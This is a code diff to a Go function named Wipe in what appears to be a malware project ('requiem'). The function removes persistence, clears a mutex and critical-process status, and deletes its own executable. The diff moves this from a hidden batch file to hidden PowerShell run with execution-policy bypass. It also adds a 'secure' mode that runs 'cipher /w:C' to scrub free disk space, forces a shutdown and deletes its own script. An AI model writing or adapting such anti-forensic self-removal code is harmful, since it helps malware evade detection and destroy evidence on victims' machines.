@@ -12,7 +12,7 @@ import (
 	"requiem/utils"
 )
 
-func Wipe() {
+func Wipe(secure bool) {
 	persistence.Unpersist()
 
 	utils.RemoveMutex()
@@ -20,23 +20,40 @@ func Wipe() {
 	SetCritical(false)
 
 	var wipe strings.Builder
-	wipe.WriteString("@echo off\n")
-	wipe.WriteString("timeout /t 2 /nobreak > nul\n")
-	fmt.Fprintf(&wipe, "taskkill /f /pid %d\n", os.Getpid())
-	wipe.WriteString("timeout /t 1 /nobreak > nul\n")
+	wipe.WriteString("sleep 1\n")
+	fmt.Fprintf(&wipe, "kill -Id %d -Force\n", os.Getpid())
 	fmt.Fprintf(&wipe, "attrib -h -s \"%s\"\n", store.ExecPath)
-	fmt.Fprintf(&wipe, "del /f /q \"%s\"\n", store.ExecPath)
-	wipe.WriteString("del /f /q \"%~f0\"\n")
+	fmt.Fprintf(&wipe, "rm -fo \"%s\"\n", store.ExecPath)
 
-	name := fmt.Sprintf("%d.bat", time.Now().UnixNano())
-	path := filepath.Join(os.TempDir(), name)
+	if secure {
+		var cipher strings.Builder
 
-	err := os.WriteFile(path, []byte(wipe.String()), 0666)
+		cipherName := fmt.Sprintf("%dp.ps1", time.Now().UnixNano())
+		cipherPath := filepath.Join(os.TempDir(), cipherName)
+
+		cipher.WriteString("cipher /w:C\n")
+		cipher.WriteString("shutdown /s /f /t 0\n")
+		fmt.Fprintf(&cipher, "rm -fo \"%s\"\n", cipherPath)
+
+		err := os.WriteFile(cipherPath, []byte(cipher.String()), 0666)
+		if err != nil {
+			return
+		}
+
+		fmt.Fprintf(&wipe, "start powershell -Args '-nop -w hidden -ep bypass -File \"%s\"' -w hidden\n", cipherPath)
+	}
+
+	wipeName := fmt.Sprintf("%d.ps1", time.Now().UnixNano())
+	wipePath := filepath.Join(os.TempDir(), wipeName)
+
+	fmt.Fprintf(&wipe, "rm -fo \"%s\"\n", wipePath)
+
+	err := os.WriteFile(wipePath, []byte(wipe.String()), 0666)
 	if err != nil {
 		return
 	}
 
-	cmd := utils.StartCommand("cmd", "/c", path)
+	cmd := utils.StartCommand("powershell", "-nop", "-w", "hidden", "-ep", "bypass", "-File", wipePath)
 	cmd.Start()
 
 	os.Exit(0)
